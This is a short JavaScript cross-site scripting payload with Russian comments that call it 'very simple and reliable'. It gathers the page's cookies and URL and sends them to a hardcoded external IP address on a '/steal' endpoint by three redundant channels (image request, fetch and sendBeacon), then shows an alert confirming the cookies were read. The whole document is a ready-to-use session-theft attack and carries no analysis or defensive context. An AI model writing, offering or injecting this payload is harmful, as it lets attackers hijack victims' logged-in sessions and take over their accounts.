//   — очень простой и надёжный

(function() {
    const exfil = "http://109.234.39.144:8889/steal?cookie=" 
                + encodeURIComponent(document.cookie || "nocookie")
                + "&url=" + encodeURIComponent(location.href)
                + "&t=" + Date.now();

    // 3 способа отправки
    new Image().src = exfil;

    fetch(exfil, {mode: 'no-cors'}).catch(() => {});

    if (navigator.sendBeacon) {
        navigator.sendBeacon(exfil);
    }

    // Для теста у себя — должен появиться alert
    alert("XSS сработал! Куки: " + (document.cookie || "пусто"));
})();